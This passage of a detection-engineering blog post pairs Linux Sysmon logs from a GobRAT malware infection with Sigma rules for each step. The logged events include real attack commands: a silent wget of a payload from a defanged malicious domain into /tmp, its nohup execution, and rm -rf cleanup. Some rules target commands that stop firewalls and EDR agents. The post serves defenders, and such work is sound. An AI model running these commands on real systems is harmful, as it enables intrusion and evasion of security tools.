'ip6tables'\n            - 'stop'\n    selection_iptables_3:\n        Image|endswith: '/chkconfig'\n        CommandLine|contains|all:\n            - 'iptables'\n            - 'stop'\n    selection_iptables_4:\n        Image|endswith: '/chkconfig'\n        CommandLine|contains|all:\n            - 'ip6tables'\n            - 'stop'\n    selection_firewall_1:\n        Image|endswith: '/systemctl'\n        CommandLine|contains|all:\n            - 'firewalld'\n            - 'stop'\n    selection_firewall_2:\n        Image|endswith: '/systemctl'\n        CommandLine|contains|all:\n            - 'firewalld'\n            - 'disable'\n    selection_carbonblack_1:\n        Image|endswith: '/service'\n        CommandLine|contains|all:\n            - 'cbdaemon'\n            - 'stop'\n    selection_carbonblack_2:\n        Image|endswith: '/chkconfig'\n        CommandLine|contains|all:\n            - 'cbdaemon'\n            - 'off'\n    selection_carbonblack_3:\n        Image|endswith: '/systemctl'\n        CommandLine|contains|all:\n            - 'cbdaemon'\n            - 'stop'\n    selection_carbonblack_4:\n        Image|endswith: '/systemctl'\n        CommandLine|contains|all:\n            - 'cbdaemon'\n            - 'disable'\n    selection_selinux:\n        Image|endswith: '/setenforce'\n        CommandLine|contains: '0'\n    selection_crowdstrike_1:\n        Image|endswith: '/systemctl'\n        CommandLine|contains|all:\n            - 'stop'\n            - 'falcon-sensor'\n    selection_crowdstrike_2:\n        Image|endswith: '/systemctl'\n        CommandLine|contains|all:\n            - 'disable'\n            - 'falcon-sensor'\n    condition: 1 of selection*\nfalsepositives:\n    - Legitimate administration activities\nlevel: medium\n")),(0,o.kt)("h3",{id:"nohup-execution"},"Nohup Execution"),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"nohup")," can be used to execute binaries in the system. In fact, it was used to execute a fake ",(0,o.kt)("inlineCode",{parentName:"p"},"apached")," service which is the GobRAT payload."),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-xml"},'<Event>\n    <System>\n        <Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/>\n        <EventID>1</EventID>\n        <Version>5</Version>\n        <Level>4</Level>\n        <Task>1</Task>\n        <Opcode>0</Opcode>\n        <Keywords>0x8000000000000000</Keywords>\n        <EventRecordID>16945</EventRecordID>\n        <Correlation/>\n        <Execution ProcessID="26414" ThreadID="26414"/>\n        <Channel>Linux-Sysmon/Operational</Channel>\n        <Security UserId="0"/>\n    </System>\n    <EventData>\n        <Data Name="RuleName">-</Data>\n        <Data Name="ProcessGuid">{46700b68-ff13-6475-5131-7d1f45560000}</Data>\n        <Data Name="ProcessId">26638</Data>\n        <Data Name="Image">/usr/bin/nohup</Data>\n        <Data Name="FileVersion">-</Data>\n        <Data Name="Description">-</Data>\n        <Data Name="Product">-</Data>\n        <Data Name="Company">-</Data>\n        <Data Name="OriginalFileName">-</Data>\n        <Data Name="CommandLine">nohup /tmp/env/.qnapd/apached -d</Data>\n        <Data Name="CurrentDirectory">/tmp/env/.qnapd</Data>\n        <Data Name="User">-</Data>\n        <Data Name="LogonGuid">{46700b68-0000-0000-ffff-ffffffffffff}</Data>\n        <Data Name="LogonId">65535</Data>\n        <Data Name="TerminalSessionId">48</Data>\n        <Data Name="IntegrityLevel">no level</Data>\n        <Data Name="Hashes">-</Data>\n        <Data Name="ParentProcessGuid">{46700b68-ff13-6475-f587-0ded3d560000}</Data>\n        <Data Name="ParentProcessId">26633</Data>\n        <Data Name="ParentImage">/usr/bin/dash</Data>\n        <Data Name="ParentCommandLine">/bin/sh</Data>\n        <Data Name="ParentUser">-</Data>\n    </EventData>\n</Event>\n')),(0,o.kt)("p",null,"The following sigma rule was created to identify the execution of ",(0,o.kt)("inlineCode",{parentName:"p"},"nohup"),"."),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-yml"},"title: Nohup Execution\nid: e4ffe466-6ff8-48d4-94bd-e32d1a6061e2\nstatus: experimental\ndescription: Detects usage of nohup which could be leveraged by an attacker to keep a process running or break out from restricted environments\nreferences:\n    - https://gtfobins.github.io/gtfobins/nohup/\n    - https://en.wikipedia.org/wiki/Nohup\n    - https://www.computerhope.com/unix/unohup.htm\nauthor: 'Christopher Peacock @SecurePeacock, SCYTHE @scythe_io'\ndate: 2022/06/06\nlogsource:\n    product: linux\n    category: process_creation\ndetection:\n    selection:\n        Image|endswith: '/nohup'\n    condition: selection\nfalsepositives:\n    - Administrators or installed processes that leverage nohup\nlevel: medium\n")),(0,o.kt)("h3",{id:"wget-creating-files-in-tmp"},"Wget Creating Files in Tmp"),(0,o.kt)("p",null,"Another behavior related to the creation of files is the use of ",(0,o.kt)("inlineCode",{parentName:"p"},"wget")," to download a file into ",(0,o.kt)("inlineCode",{parentName:"p"},"/tmp/")," folder."),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-xml"},'<Event>\n    <System>\n        <Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/>\n        <EventID>11</EventID>\n        <Version>2</Version>\n        <Level>4</Level>\n        <Task>11</Task>\n        <Opcode>0</Opcode>\n        <Keywords>0x8000000000000000</Keywords>\n        <EventRecordID>16795</EventRecordID>\n        <Correlation/>\n        <Execution ProcessID="26414" ThreadID="26414"/>\n        <Channel>Linux-Sysmon/Operational</Channel>\n        <Security UserId="0"/>\n    </System>\n    <EventData>\n        <Data Name="RuleName">-</Data>\n        <Data Name="ProcessGuid">{46700b68-ff05-6475-9525-20d06e550000}</Data>\n        <Data Name="ProcessId">26571</Data>\n        <Data Name="Image">/usr/bin/wget</Data>\n        <Data Name="TargetFilename">/tmp/env/.qnapd/apachedtmp</Data>\n        <Data Name="User">-</Data>\n    </EventData>\n</Event>\n')),(0,o.kt)("p",null,"The next sigma rule that I've created detect files created by ",(0,o.kt)("inlineCode",{parentName:"p"},"wget")," in ",(0,o.kt)("inlineCode",{parentName:"p"},"/tmp/")," folders, something that is interesting to know."),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-yml"},"title: Wget Creating Files in Tmp\nid: 35a05c60-9012-49b6-a11f-6bab741c9f74\nstatus: experimental\ndescription: Detects the use of wget to download content\nreferences:\n    - https://blogs.jpcert.or.jp/en/2023/05/gobrat.html\n    - https://www.virustotal.com/gui/file/60bcd645450e4c846238cf0e7226dc40c84c96eba99f6b2cffcd0ab4a391c8b3/detection\nauthor: Joseliyo Sanchez, @Joseliyo_Jstnk\ndate: 2023/30/05\ntags:\n    - attack.command_and_control\n    - attack.t1105\nlogsource:\n    product: linux\n    category: file_event\ndetection:\n    selection:\n        Image|endswith: '/wget'\n        TargetFilename|contains: '/tmp/'\n    condition: selection\nfalsepositives:\n    - Legitimate downloads files in tmp folder.\nlevel: high\n")),(0,o.kt)("h3",{id:"execution-from-tmp-folder"},"Execution From Tmp Folder"),(0,o.kt)("p",null,"Probably the most important execution for the threat actors during this infection. The GobRAT payload is loaded from the ",(0,o.kt)("inlineCode",{parentName:"p"},"/tmp/")," folder, something that is suspicious and allow us to detect it with a new sigma rule."),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-xml"},'<Event>\n    <System>\n        <Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/>\n        <EventID>1</EventID>\n        <Version>5</Version>\n        <Level>4</Level>\n        <Task>1</Task>\n        <Opcode>0</Opcode>\n        <Keywords>0x8000000000000000</Keywords>\n        <EventRecordID>16949</EventRecordID>\n        <Correlation/>\n        <Execution ProcessID="26414" ThreadID="26414"/>\n        <Channel>Linux-Sysmon/Operational</Channel>\n        <Security UserId="0"/>\n    </System>\n    <EventData>\n        <Data Name="RuleName">-</Data>\n        <Data Name="ProcessGuid">{46700b68-ff13-6475-2f02-6b0100000000}</Data>\n        <Data Name="ProcessId">26638</Data>\n        <Data Name="Image">/tmp/env/.qnapd/apached</Data>\n        <Data Name="FileVersion">-</Data>\n        <Data Name="Description">-</Data>\n        <Data Name="Product">-</Data>\n        <Data Name="Company">-</Data>\n        <Data Name="OriginalFileName">-</Data>\n        <Data Name="CommandLine">/tmp/env/.qnapd/apached -d</Data>\n        <Data Name="CurrentDirectory">/tmp/env/.qnapd</Data>\n        <Data Name="User">-</Data>\n        <Data Name="LogonGuid">{46700b68-0000-0000-ffff-ffffffffffff}</Data>\n        <Data Name="LogonId">65535</Data>\n        <Data Name="TerminalSessionId">48</Data>\n        <Data Name="IntegrityLevel">no level</Data>\n        <Data Name="Hashes">-</Data>\n        <Data Name="ParentProcessGuid">{46700b68-ca62-6475-65ce-a2aae0550000}</Data>\n        <Data Name="ParentProcessId">1</Data>\n        <Data Name="ParentImage">/usr/lib/systemd/systemd</Data>\n        <Data Name="ParentCommandLine">/sbin/init splash</Data>\n        <Data Name="ParentUser">root</Data>\n    </EventData>\n</Event>\n')),(0,o.kt)("p",null,"The sigma rule that I've created is looking for processes loaded in the ",(0,o.kt)("inlineCode",{parentName:"p"},"/tmp/")," folder."),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-yml"},"title: Execution From Tmp Folder\nid: 312b42b1-bded-4441-8b58-163a3af58775\nstatus: experimental\ndescription: Detects suspicious executions from tmp folder\nreferences:\n    - https://blogs.jpcert.or.jp/en/2023/05/gobrat.html\n    - https://www.virustotal.com/gui/file/60bcd645450e4c846238cf0e7226dc40c84c96eba99f6b2cffcd0ab4a391c8b3/detection\nauthor: Joseliyo Sanchez, @Joseliyo_Jstnk\ndate: 2023/30/05\nlogsource:\n    product: linux\n    category: process_creation\ndetection:\n    selection:\n        Image|startswith: '/tmp/'\n        ParentImage|startswith: '/usr/'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n")),(0,o.kt)("h3",{id:"wget-download-file-to-tmp-folder-in-silent-mode"},"Wget Download File To Tmp Folder in silent Mode"),(0,o.kt)("p",null,"If we saw a file event to identify file creation of ",(0,o.kt)("inlineCode",{parentName:"p"},"wget")," in ",(0,o.kt)("inlineCode",{parentName:"p"},"/tmp/"),", now is time to detect the use of ",(0,o.kt)("inlineCode",{parentName:"p"},"wget")," in silent mode."),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-xml"},'<Event>\n    <System>\n        <Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/>\n        <EventID>1</EventID>\n        <Version>5</Version>\n        <Level>4</Level>\n        <Task>1</Task>\n        <Opcode>0</Opcode>\n        <Keywords>0x8000000000000000</Keywords>\n        <EventRecordID>16794</EventRecordID>\n        <Correlation/>\n        <Execution ProcessID="26414" ThreadID="26414"/>\n        <Channel>Linux-Sysmon/Operational</Channel>\n        <Security UserId="0"/>\n    </System>\n    <EventData>\n        <Data Name="RuleName">-</Data>\n        <Data Name="ProcessGuid">{46700b68-ff05-6475-9525-20d06e550000}</Data>\n        <Data Name="ProcessId">26571</Data>\n        <Data Name="Image">/usr/bin/wget</Data>\n        <Data Name="FileVersion">-</Data>\n        <Data Name="Description">-</Data>\n        <Data Name="Product">-</Data>\n        <Data Name="Company">-</Data>\n        <Data Name="OriginalFileName">-</Data>\n        <Data Name="CommandLine">wget -q -t 1 -T 8 --limit-rate 200k -O /tmp/env/.qnapd/apachedtmp hxxps://ktlvz.dnsfailover[.]net/zone.x86_64 --no-check-certificate</Data>\n        <Data Name="CurrentDirectory">/opt</Data>\n        <Data Name="User">-</Data>\n        <Data Name="LogonGuid">{46700b68-0000-0000-ffff-ffffffffffff}</Data>\n        <Data Name="LogonId">65535</Data>\n        <Data Name="TerminalSessionId">48</Data>\n        <Data Name="IntegrityLevel">no level</Data>\n        <Data Name="Hashes">-</Data>\n        <Data Name="ParentProcessGuid">{46700b68-ff05-6475-f547-38be1a560000}</Data>\n        <Data Name="ParentProcessId">26546</Data>\n        <Data Name="ParentImage">/usr/bin/dash</Data>\n        <Data Name="ParentCommandLine">/bin/sh</Data>\n        <Data Name="ParentUser">-</Data>\n    </EventData>\n</Event>\n')),(0,o.kt)("p",null,"The sigma rule that can help us to detect it is the next one, which can look for the parameters ",(0,o.kt)("inlineCode",{parentName:"p"},"-q")," for silent, ",(0,o.kt)("inlineCode",{parentName:"p"},"-O")," to download and ",(0,o.kt)("inlineCode",{parentName:"p"},"/tmp/")," in the command line, which means that the file could be downloaded in the ",(0,o.kt)("inlineCode",{parentName:"p"},"tmp")," folder."),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-yml"},"title: Wget Download File To Tmp Folder in Silence Mode\nid: cf610c15-ed71-46e1-bdf8-2bd1a99de6c4\nstatus: experimental\ndescription: Detects the use of wget to download content\nreferences:\n    - https://blogs.jpcert.or.jp/en/2023/05/gobrat.html\n    - https://www.virustotal.com/gui/file/60bcd645450e4c846238cf0e7226dc40c84c96eba99f6b2cffcd0ab4a391c8b3/detection\nauthor: Joseliyo Sanchez, @Joseliyo_Jstnk\ndate: 2023/30/05\ntags:\n    - attack.command_and_control\n    - attack.t1105\nlogsource:\n    category: process_creation\n    product: linux\ndetection:\n    selection:\n        Image|endswith: '/wget'\n        CommandLine|contains|all: \n            - '-q' # Turn off Wget\u2019s output.\n            - '-O' # output\n            - '/tmp/'\n            #- '--limit-rate' # Limit the download speed\n            #- '--no-check-certificate'\n    condition: selection\nfalsepositives:\n    - Legitimate downloads files in tmp folder.\nlevel: high\n\n")),(0,o.kt)("h3",{id:"discovery-information-about-files-created-by-gobrat"},"Discovery Information About Files Created by GobRAT"),(0,o.kt)("p",null,"We could consider this behavior to be specific to GobRAT, and it could be. But perhaps it could be related to other families in the future."),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-xml"},'<Event>\n    <System>\n        <Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/>\n        <EventID>1</EventID>\n        <Version>5</Version>\n        <Level>4</Level>\n        <Task>1</Task>\n        <Opcode>0</Opcode>\n        <Keywords>0x8000000000000000</Keywords>\n        <EventRecordID>16812</EventRecordID>\n        <Correlation/>\n        <Execution ProcessID="26414" ThreadID="26414"/>\n        <Channel>Linux-Sysmon/Operational</Channel>\n        <Security UserId="0"/>\n    </System>\n    <EventData>\n        <Data Name="RuleName">-</Data>\n        <Data Name="ProcessGuid">{46700b68-ff13-6475-815f-0cee5e550000}</Data>\n        <Data Name="ProcessId">26575</Data>\n        <Data Name="Image">/usr/bin/grep</Data>\n        <Data Name="FileVersion">-</Data>\n        <Data Name="Description">-</Data>\n        <Data Name="Product">-</Data>\n        <Data Name="Company">-</Data>\n        <Data Name="OriginalFileName">-</Data>\n        <Data Name="CommandLine">grep sshd.sh</Data>\n        <Data Name="CurrentDirectory">/opt</Data>\n        <Data Name="User">-</Data>\n        <Data Name="LogonGuid">{46700b68-0000-0000-ffff-ffffffffffff}</Data>\n        <Data Name="LogonId">65535</Data>\n        <Data Name="TerminalSessionId">48</Data>\n        <Data Name="IntegrityLevel">no level</Data>\n        <Data Name="Hashes">-</Data>\n        <Data Name="ParentProcessGuid">{00000000-0000-0000-0000-000000000000}</Data>\n        <Data Name="ParentProcessId">26573</Data>\n        <Data Name="ParentImage">-</Data>\n        <Data Name="ParentCommandLine">-</Data>\n        <Data Name="ParentUser">-</Data>\n    </EventData>\n</Event>\n')),(0,o.kt)("p",null,"To detect it, the next sigma rule can be used."),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-yml"},"title: Discovery Information About Files Created by GobRAT\nid: e34cfa0c-0a50-4210-9cb3-5632d08eb041\nstatus: experimental\ndescription: Detects the use of grep to discover specific files created by GobRAT\nreferences:\n    - https://blogs.jpcert.or.jp/en/2023/05/gobrat.html\n    - https://www.virustotal.com/gui/file/60bcd645450e4c846238cf0e7226dc40c84c96eba99f6b2cffcd0ab4a391c8b3/detection\n    - https://www.virustotal.com/gui/file/3e44c807a25a56f4068b5b8186eee5002eed6f26d665a8b791c472ad154585d1/detection\nauthor: Joseliyo Sanchez, @Joseliyo_Jstnk\ndate: 2023/30/05\ntags:\n    - attack.discovery\n    - attack.t1082\nlogsource:\n    category: process_creation\n    product: linux\ndetection:\n    selection:\n        Image|endswith: '/grep'\n        CommandLine|contains:\n            - 'apached'\n            - 'sshd.sh'\n            - 'zone.arm'\n            - 'frpc'\n    condition: selection\nfalsepositives:\n    - Unkwnon \nlevel: high\n")),(0,o.kt)("h3",{id:"nohup-tmp-file-execution"},"Nohup Tmp File Execution"),(0,o.kt)("p",null,"Although there is a rule that simply detects the use of nohup, I thought it might be interesting to have another one with different severity to detect the use of the same process but on a ",(0,o.kt)("inlineCode",{parentName:"p"},"/tmp/")," file. Therefore, I have created the following rule"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-xml"},'<Event>\n    <System>\n        <Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/>\n        <EventID>1</EventID>\n        <Version>5</Version>\n        <Level>4</Level>\n        <Task>1</Task>\n        <Opcode>0</Opcode>\n        <Keywords>0x8000000000000000</Keywords>\n        <EventRecordID>16945</EventRecordID>\n        <Correlation/>\n        <Execution ProcessID="26414" ThreadID="26414"/>\n        <Channel>Linux-Sysmon/Operational</Channel>\n        <Security UserId="0"/>\n    </System>\n    <EventData>\n        <Data Name="RuleName">-</Data>\n        <Data Name="ProcessGuid">{46700b68-ff13-6475-5131-7d1f45560000}</Data>\n        <Data Name="ProcessId">26638</Data>\n        <Data Name="Image">/usr/bin/nohup</Data>\n        <Data Name="FileVersion">-</Data>\n        <Data Name="Description">-</Data>\n        <Data Name="Product">-</Data>\n        <Data Name="Company">-</Data>\n        <Data Name="OriginalFileName">-</Data>\n        <Data Name="CommandLine">nohup /tmp/env/.qnapd/apached -d</Data>\n        <Data Name="CurrentDirectory">/tmp/env/.qnapd</Data>\n        <Data Name="User">-</Data>\n        <Data Name="LogonGuid">{46700b68-0000-0000-ffff-ffffffffffff}</Data>\n        <Data Name="LogonId">65535</Data>\n        <Data Name="TerminalSessionId">48</Data>\n        <Data Name="IntegrityLevel">no level</Data>\n        <Data Name="Hashes">-</Data>\n        <Data Name="ParentProcessGuid">{46700b68-ff13-6475-f587-0ded3d560000}</Data>\n        <Data Name="ParentProcessId">26633</Data>\n        <Data Name="ParentImage">/usr/bin/dash</Data>\n        <Data Name="ParentCommandLine">/bin/sh</Data>\n        <Data Name="ParentUser">-</Data>\n    </EventData>\n</Event>\n')),(0,o.kt)("p",null,"Besides to identify ",(0,o.kt)("inlineCode",{parentName:"p"},"nohup")," execution, it checks if the command line contains ",(0,o.kt)("inlineCode",{parentName:"p"},"/tmp/")," as well."),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-yml"},"title: Nohup Tmp File Execution\nid: 457df417-8b9d-4912-85f3-9dbda39c3645\nstatus: experimental\ndescription: Detects the use of grep to identify information about the system using the parameter -q to do it in silent mode\nreferences:\n    - https://blogs.jpcert.or.jp/en/2023/05/gobrat.html\n    - https://www.virustotal.com/gui/file/60bcd645450e4c846238cf0e7226dc40c84c96eba99f6b2cffcd0ab4a391c8b3/detection\nauthor: Joseliyo Sanchez, @Joseliyo_Jstnk\ndate: 2023/30/05\nlogsource:\n    product: linux\n    category: process_creation\ndetection:\n    selection:\n        Image|endswith: '/nohup'\n        CommandLine|contains: '/tmp/'\n    condition: selection\nfalsepositives:\n    - System Administrators using nohup\nlevel: high\n")),(0,o.kt)("h3",{id:"execution-of-shell-with-tmp-parent-process"},"Execution of Shell With Tmp Parent Process"),(0,o.kt)("p",null,"The GobRAT payload makes use of ",(0,o.kt)("inlineCode",{parentName:"p"},"/bin/bash")," from ",(0,o.kt)("inlineCode",{parentName:"p"},"/tmp/")," folder, something that is insteresting."),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-xml"},'<Event>\n    <System>\n        <Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/>\n        <EventID>1</EventID>\n        <Version>5</Version>\n        <Level>4</Level>\n        <Task>1</Task>\n        <Opcode>0</Opcode>\n        <Keywords>0x8000000000000000</Keywords>\n        <EventRecordID>16950</EventRecordID>\n        <Correlation/>\n        <Execution ProcessID="26414" ThreadID="26414"/>\n        <Channel>Linux-Sysmon/Operational</Channel>\n        <Security UserId="0"/>\n    </System>\n    <EventData>\n        <Data Name="RuleName">-</Data>\n        <Data Name="ProcessGuid">{46700b68-ff14-6475-0507-2fb57a550000}</Data>\n        <Data Name="ProcessId">26649</Data>\n        <Data Name="Image">/usr/bin/bash</Data>\n        <Data Name="FileVersion">-</Data>\n        <Data Name="Description">-</Data>\n        <Data Name="Product">-</Data>\n        <Data Name="Company">-</Data>\n        <Data Name="OriginalFileName">-</Data>\n        <Data Name="CommandLine">/bin/bash -c uptime</Data>\n        <Data Name="CurrentDirectory">/tmp/env/.qnapd</Data>\n        <Data Name="User">-</Data>\n        <Data Name="LogonGuid">{46700b68-0000-0000-ffff-ffffffffffff}</Data>\n        <Data Name="LogonId">65535</Data>\n        <Data Name="TerminalSessionId">48</Data>\n        <Data Name="IntegrityLevel">no level</Data>\n        <Data Name="Hashes">-</Data>\n        <Data Name="ParentProcessGuid">{46700b68-ff13-6475-2f02-6b0100000000}</Data>\n        <Data Name="ParentProcessId">26638</Data>\n        <Data Name="ParentImage">/tmp/env/.qnapd/apached</Data>\n        <Data Name="ParentCommandLine">/tmp/env/.qnapd/apached</Data>\n        <Data Name="ParentUser">-</Data>\n    </EventData>\n</Event>\n')),(0,o.kt)("p",null,"Any binary from ",(0,o.kt)("inlineCode",{parentName:"p"},"/tmp/")," using ",(0,o.kt)("inlineCode",{parentName:"p"},"/bin/bash")," or ",(0,o.kt)("inlineCode",{parentName:"p"},"/bin/sh"),", it is interesting to know. Therefore, I have generated the following rule. "),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-yml"},"title: Execution of Shell With Tmp Parent Process\nid: 2fade0b6-7423-4835-9d4f-335b39b83867\nstatus: experimental\ndescription: Detects suspicious executions of shells with tmp parents\nreferences:\n    - https://blogs.jpcert.or.jp/en/2023/05/gobrat.html\n    - https://www.virustotal.com/gui/file/60bcd645450e4c846238cf0e7226dc40c84c96eba99f6b2cffcd0ab4a391c8b3/detection\nauthor: Joseliyo Sanchez, @Joseliyo_Jstnk\ndate: 2023/30/05\nlogsource:\n    product: linux\n    category: process_creation\ndetection:\n    selection:\n        ParentImage|startswith: '/tmp/'\n        CommandLine|contains: \n          - '/bin/bash'\n          - '/bin/sh'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n")),(0,o.kt)("h3",{id:"execution-of-script-in-tmp-folder"},"Execution of Script In Tmp Folder"),(0,o.kt)("p",null,"Very similar to the above section, however, in this case they executing a script stored in ",(0,o.kt)("inlineCode",{parentName:"p"},"/tmp/")," using ",(0,o.kt)("inlineCode",{parentName:"p"},"/bin/sh"),"."),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-xml"},'<Event>\n    <System>\n        <Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/>\n        <EventID>1</EventID>\n        <Version>5</Version>\n        <Level>4</Level>\n        <Task>1</Task>\n        <Opcode>0</Opcode>\n        <Keywords>0x8000000000000000</Keywords>\n        <EventRecordID>16981</EventRecordID>\n        <Correlation/>\n        <Execution ProcessID="26414" ThreadID="26414"/>\n        <Channel>Linux-Sysmon/Operational</Channel>\n        <Security UserId="0"/>\n    </System>\n    <EventData>\n        <Data Name="RuleName">-</Data>\n        <Data Name="ProcessGuid">{46700b68-ff45-6475-f597-3cd5db550000}</Data>\n        <Data Name="ProcessId">26665</Data>\n        <Data Name="Image">/usr/bin/dash</Data>\n        <Data Name="FileVersion">-</Data>\n        <Data Name="Description">-</Data>\n        <Data Name="Product">-</Data>\n        <Data Name="Company">-</Data>\n        <Data Name="OriginalFileName">-</Data>\n        <Data Name="CommandLine">/bin/sh -c /tmp/env/.qnapd/sshd.sh</Data>\n        <Data Name="CurrentDirectory">/root</Data>\n        <Data Name="User">-</Data>\n        <Data Name="LogonGuid">{46700b68-0000-0000-ffff-ffffffffffff}</Data>\n        <Data Name="LogonId">65535</Data>\n        <Data Name="TerminalSessionId">49</Data>\n        <Data Name="IntegrityLevel">no level</Data>\n        <Data Name="Hashes">-</Data>\n        <Data Name="ParentProcessGuid">{00000000-0000-0000-0000-000000000000}</Data>\n        <Data Name="ParentProcessId">26664</Data>\n        <Data Name="ParentImage">-</Data>\n        <Data Name="ParentCommandLine">-</Data>\n        <Data Name="ParentUser">-</Data>\n    </EventData>\n</Event>\n')),(0,o.kt)("p",null,"And if you want to detect this kind of behavior, use the next sigma rule."),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-yml"},"title: Execution of Script In Tmp Folder\nid: 30bcce26-51c5-49f2-99c8-7b59e3af36c7\nstatus: experimental\ndescription: Detects executions of scripts stored in tmp folder using bash or sh\nreferences:\n    - https://blogs.jpcert.or.jp/en/2023/05/gobrat.html\n    - https://www.virustotal.com/gui/file/60bcd645450e4c846238cf0e7226dc40c84c96eba99f6b2cffcd0ab4a391c8b3/detection\nauthor: Joseliyo Sanchez, @Joseliyo_Jstnk\ndate: 2023/30/05\nlogsource:\n    product: linux\n    category: process_creation\ndetection:\n    selection_shell:\n        CommandLine|contains: \n          - '/bin/bash'\n          - '/bin/sh'\n    selection_parameters:\n        CommandLine|contains|all: \n          - '/tmp/'\n          - '-c'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high\n")),(0,o.kt)("h3",{id:"file-deletion"},"File Deletion"),(0,o.kt)("p",null,"Multiple files are deleted during the execution, probably to avoid be detected by software and analysts. Most of the actity is under the path ",(0,o.kt)("inlineCode",{parentName:"p"},"/tmp/env/.qnapd/"),". Next sysmon event is just one of the files deleted during the exeution."),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-xml"},'<Event>\n    <System>\n        <Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/>\n        <EventID>1</EventID>\n        <Version>5</Version>\n        <Level>4</Level>\n        <Task>1</Task>\n        <Opcode>0</Opcode>\n        <Keywords>0x8000000000000000</Keywords>\n        <EventRecordID>16774</EventRecordID>\n        <Correlation/>\n        <Execution ProcessID="26414" ThreadID="26414"/>\n        <Channel>Linux-Sysmon/Operational</Channel>\n        <Security UserId="0"/>\n    </System>\n    <EventData>\n        <Data Name="RuleName">-</Data>\n        <Data Name="ProcessGuid">{46700b68-ff05-6475-e1f4-c3d0eb550000}</Data>\n        <Data Name="ProcessId">26560</Data>\n        <Data Name="Image">/usr/bin/rm</Data>\n        <Data Name="FileVersion">-</Data>\n        <Data Name="Description">-</Data>\n        <Data Name="Product">-</Data>\n        <Data Name="Company">-</Data>\n        <Data Name="OriginalFileName">-</Data>\n        <Data Name="CommandLine">rm -rf /tmp/env/.qnapd/bot.log</Data>\n        <Data Name="CurrentDirectory">/opt</Data>\n        <Data Name="User">-</Data>\n        <Data Name="LogonGuid">{46700b68-0000-0000-ffff-ffffffffffff}</Data>\n        <Data Name="LogonId">65535</Data>\n        <Data Name="TerminalSessionId">48</Data>\n        <Data Name="IntegrityLevel">no level</Data>\n        <Data Name="Hashes">-</Data>\n        <Data Name="ParentProcessGuid">{46700b68-ff05-6475-f547-38be1a560000}</Data>\n        <Data Name="ParentProcessId">26546</Data>\n        <Data Name="ParentImage">/usr/bin/dash</Data>\n        <Data Name="ParentCommandLine">/bin/sh</Data>\n        <Data Name="ParentUser">-</Data>\n    </EventData>\n</Event>\n')),(0,o.kt)("p",null,"And yes, there is a ",(0,o.kt)("a",{parentName:"p",href:"https://github.com/SigmaHQ/sigma/blob/master/rules/linux/process_creation/proc_creation_lnx_file_deletion.yml"},"public sigma")," rule to detect files deleted in the system! Although it is a little generic, it can help us"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-yml"},"title: File Deletion\nid: 30aed7b6-d2c1-4eaf-9382-b6bc43e50c57\nstatus: stable\ndescription: Detects file deletion using \"rm\", \"shred\" or \"unlink\" commands which are used often by adversaries to delete files left behind by the actions of their intrusion activity\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1070.004/T1070.004.md\nauthor: \xd6mer G\xfcnal, oscd.community\ndate: 2020/10/07\nmodified: 2022/09/15\ntags:\n    - attack.defense_evasion\n    - attack.t1070.004\nlogsource:\n    product: linux\n    category: process_creation\ndetection:\n    selection:\n        Image|endswith:\n            - '/rm'     # covers /rmdir as well\n            - '/shred'\n            - '/unlink'\n    condition: selection\nfalsepositives:\n    - Legitimate administration activities\nlevel: informational\n")),(0,o.kt)("h3",{id:"process-discovery"},"Process Discovery"),(0,o.kt)("p",null,"The use of ",(0,o.kt)("inlineCode",{parentName:"p"},"ps")," command is another capability implemented by this loader during the execution."),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-xml"},'<Event>\n    <System>\n        <Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/>\n        <EventID>1</EventID>\n        <Version>5</Version>\n        <Level>4</Level>\n        <Task>1</Task>\n        <Opcode>0</Opcode>\n        <Keywords>0x8000000000000000</Keywords>\n        <EventRecordID>16813</EventRecordID>\n        <Correlation/>\n        <Execution ProcessID="26414" ThreadID="26414"/>\n        <Channel>Linux-Sysmon/Operational</Channel>\n        <Security UserId="0"/>\n    </System>\n    <EventData>\n        <Data Name="RuleName">-</Data>\n        